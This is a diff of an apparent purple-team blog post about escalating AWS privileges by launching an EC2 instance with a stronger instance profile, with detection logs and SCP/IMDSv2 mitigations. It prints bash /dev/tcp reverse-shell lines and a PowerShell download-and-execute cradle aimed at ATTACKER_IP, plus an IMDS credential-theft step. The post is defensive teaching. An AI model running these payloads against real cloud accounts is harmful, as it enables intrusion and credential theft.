@@ -101,7 +101,7 @@
         <div class="col-lg-8 col-md-10 mx-auto">
           <p>I have recently started looking into AWS security for work and came across this <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/" target="_blank">Rhino Labs AWS Privilege Escalation</a> blog post. It is a few years old, but still looks relevant and I noticed that the author is also the founding dev of the <a href="https://github.com/RhinoSecurityLabs/Pacu" target="_blank">Pacu</a> project... Seems like a great person to learn from! I have decided I will be doing deep dives on some of the techniques described in the blog post to get up to speed with some of the privesc techniques in AWS, starting with... 
 
-          <p>The 3rd escalation technique mentioned: "Creating an EC2 instance with an existing instance profile". It mentions spinning up an EC2 instance, but using an existing EC2 instance profile which has higher privileges than you have. You then need to find a way to log into the EC2 to request the AWS keys associated with the EC2 instance profile using the EC2 Instance Meta Data API. In the Rhino Labs blog they mention using EC2 user data to get a reverse shell from the instance, which is more exciting than SSH or SSM, so this blog covers this method.</p>
+          <p>The 3rd escalation technique mentioned: "Creating an EC2 instance with an existing instance profile". It mentions spinning up an EC2 instance, but using an existing EC2 instance profile which has higher privileges in the account. You then need to find a way to log into the EC2 to request the AWS keys associated with the EC2 instance profile using the EC2 Instance Meta Data API. In the Rhino Labs blog they mention using EC2 user data to get a reverse shell from the instance, which is more exciting than SSH or SSM, so this blog covers this method.</p>
 
           <p>Because this blog is about purple teaming, it will also cover how to detect someone doing this and how the AWS account can be setup to prevent an attacker from executing this privesc attack chain.</p>
 
@@ -120,7 +120,7 @@
 
             This is the main point of the post which is a little underwhelming, but its really worth keeping in mind that roles that you create for your EC2 instances can be hijacked by users in the account if they can also spin up EC2 instances.
             <br><br>
-            Roles in the account or Service Control Policies (SCPs) can limit who can spin up EC2 instances. SCPs are defined at an organisation level and I did not test SCPs in this blog post. The below hypothetical SCP example would only allow the role that your CICD users run with to spin up EC2 instances and you could have additional controls in place in your repos to prevent malicious pull/merge requests:
+            Roles in the account or Service Control Policies (SCPs) can limit who can spin up EC2 instances. SCPs are defined at an organisation level and I did not test SCPs in this blog post. The below hypothetical SCP example would only allow roles that start with "CICD" to spin up EC2 instances and you could have additional controls in place in your repos to prevent malicious pull/merge requests. This is a pretty weak control though, if new roles can be created a user could just name it correcly to bypass this control. 
 
             <p></p>
             
@@ -179,7 +179,7 @@ bash -i >& /dev/tcp/172.31.34.136/60000 0>&1
           </p>
 
           <p>
-            A shell was returned from the S3_reader EC2 on it's first boot. Theoretically restarts could also get the User Data to run again, which is convenient because it can be modified on an instance that is in the stopped state, but I honestly couldn't get this working (didn't try very hard though). The shell is returned for the root user because User Data runs as root. The IMDS is then queried using the link-local address (169.254.169.254) to get the temp credentials that are associated with the instance profile role. This can all be seen in the screenshot below:
+            A shell was returned from the S3_reader EC2 on it's first boot. Theoretically restarts could also get the User Data to run again, which is convenient because it can be modified on an instance that is in the stopped state, but I honestly couldn't get this working (didn't try very hard though). The shell is returned for the root user because User Data runs as root. The IMDS is then queried using the link-local address (169.254.169.254) to get the temp credentials that are associated with the instance profile role. This can all be seen in the screenshot below (if you open it in a new tab lol):
           </p>
 
           </br>
@@ -199,7 +199,7 @@ bash -i >& /dev/tcp/172.31.34.136/60000 0>&1
           <span class="caption text-muted">Reading the S3 content using the stolen credentials</span>
           
           <p>
-            I then played around with mechanisms to prevent using the roles credentials from outside the EC2 it was intended for. I first tried limiting this with a condition in the role which states that the source VPC must be the one the EC2 instance is in: 
+            I then played around with mechanisms to prevent using the roles credentials from outside the EC2. I first tried limiting this with a condition in the role which states that the source VPC must be the one the EC2 instance is in: 
           </p>
 
           </br>
@@ -207,7 +207,7 @@ bash -i >& /dev/tcp/172.31.34.136/60000 0>&1
           <span class="caption text-muted">Limiting the role use to within a specific VPC</span>
 
           <p>
-            This actually didn't help and I was still able to use the credentials from outside the VPC... So I either messed up the policy (which would be strange because I was using the AWS console), or it seems that when you don't pass a VPC in with the API request this is just ignored. If this is the case, I think AWS should rather deny requests that don't contain a VPC for roles that include this condition. I would need to do more testing though before emailing Jeff about this...
+            This actually didn't help and I was still able to use the credentials from outside the VPC... So I either messed up the policy (which would be strange because I was using the AWS console), or it seems that when you don't pass a VPC in with the API request this is just ignored. If this is the case, I think AWS should rather deny requests that don't contain a VPC for roles that include this condition. I would need to do more testing though before emailing Jeff B about this...
           </p>
 
           <p>
@@ -231,8 +231,8 @@ bash -i >& /dev/tcp/172.31.34.136/60000 0>&1
 
         </br></br>
           
-            <li>We can not see STS credentials being requested via the IMDS because this is not logged. We would need an agent on the EC2 to see this activity.</li>
-            <li>In the S3 data events we can see the log that GuardDuty is likely using for its detection. Note that in the userIdentity the EC2 instance ID is shown in the principalId and arn, but the source IP and user agent are obviously not: </li>
+            <li>We can not see STS credentials being requested via the IMDS because this is not logged. We would need a monitoring agent on the EC2 to see this activity.</li>
+            <li>In the S3 data events we can see the log that GuardDuty is likely using for its detection. Note that in the userIdentity the EC2 instance ID is shown in the principalId and arn, but the source IP is obviously not the EC2 instance and in this case the user agent is also dodgy: </li>
             <br>
             <code>
 {
@@ -278,28 +278,29 @@ bash -i >& /dev/tcp/172.31.34.136/60000 0>&1
   ...
 }</code> 
 
-
+<p></p>
             <li>An identical log to the one above exists for the GetObject eventName in the S3 data events</li>
             <li>Because these logs live in the S3 data events, if you are not collecting them you won't see the role being used outside of the EC2</li>
             <li>I could not find the Access Key: ASIAZ5UWVVHTJEKBDCJ3 in any other generic CloudTrail logs</li>
             <li>The EC2 User Data being set can be seen in the <inline-code>eventName: "ModifyInstanceAttribute"</inline-code> log by filtering for <inline-code></inline-code>requestParameters.userData=*</inline-code>. The actual content of the User Data is redacted though, so can't be inspected for malicious content</li>
 
-          <h2 class="section-heading">SSH, SSM, and the Bypass</h2>
+          <h2 class="section-heading">Bypass Blocked SSH and SSM</h2>
 
-          <p>Typically, SSH keys or AWS Systems Manager (SSM) are used to administer EC2 instances. But if those are disabled or inaccessible, an attacker who can supply or modify user data can execute commands as root. This allows them to query the Instance Metadata Service (IMDS) over the local link address <code>169.254.169.254</code> to retrieve temporary AWS credentials for the instance’s attached role.</p>
+          <p>Typically, SSH keys or AWS Systems Manager (SSM) are used to administer EC2 instances. But if those are disabled or inaccessible, an attacker who can supply or modify user data can execute commands as root. This allows them to query the Instance Metadata Service (IMDS) over the local link address <inline-code>169.254.169.254</inline-code> to retrieve temporary AWS credentials for the instance’s attached role.</p>
 
           <p>Why does this work? The EC2 instance itself does not store credentials permanently. Instead, IMDS fetches temporary credentials on-demand from AWS STS (Security Token Service) for the role attached via the instance profile. Any process running on the instance can reach IMDS via the link-local IP, bypassing firewalls or lack of external access.</p>
 
           <h2 class="section-heading">Example Payloads</h2>
 
-          <p>Here are simple demonstration payloads showing how an attacker could leverage User Data for a shell. <strong>These are for demonstration only, do not use in production or on unowned environments.</strong></p>
+          <p>Here are simple demonstration payloads showing how an attacker could leverage User Data for a shell. <strong>These are for demonstration only, do not use in production or in unowned environments.</strong></p>
 
           <p><u>Linux (Netcat Reverse Shell Example)</u>:</p>
           <code>#!/bin/bash
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code>
 
           <p><u>Windows (PowerShell Reverse Shell Example)</u>:</p>
-          <code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"</code>
+          <code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command 
+            "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"</code>
 
           <p>Both payloads are executed with full administrative privileges on first boot through user data, demonstrating why User Data can be a critical escalation vector.</p>
 
@@ -307,15 +308,13 @@ bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code>
 
           <p>You cannot disable User Data entirely, but you can control its use:</p>
           <ul>
-            <li>Use Service Control Policies (SCPs) to restrict <code>ec2:RunInstances</code> or <code>ec2:ModifyInstanceAttribute</code> unless performed by trusted roles.</li>
-            <li>Whitelist approved launch templates or AMIs, which enforce safe user data.</li>
-            <li>Enforce the use of IMDSv2 to reduce SSRF attacks (though this does not prevent local exploitation).</li>
-            <li>Separate duties for deployment and operational roles to minimize <code>iam:PassRole</code> abuse.</li>
+            <li>Use Service Control Policies (SCPs) to restrict <inline-code>ec2:RunInstances</inline-code> or <inline-code>ec2:ModifyInstanceAttribute</inline-code> unless performed by trusted roles.</li>
+            <li>Enforce the use of IMDSv2 to reduce SSRF attacks (though this does not prevent local exploitation). <a href="https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/" target="_blank">ref</a></li>
           </ul>
 
           <h2 class="section-heading">Observing User Data Activity in CloudWatch</h2>
 
-          <p>CloudTrail logs EC2 API calls such as <code>RunInstances</code> and <code>ModifyInstanceAttribute</code>. Suspicious patterns include:</p>
+          <p>CloudTrail logs EC2 API calls such as <inline-code>RunInstances</inline-code> and <inline-code>ModifyInstanceAttribute</inline-code>. Suspicious patterns include:</p>
           <ul>
             <li>Instances launched with unexpected user data scripts</li>
             <li>Modification of existing instance attributes, including user data</li>
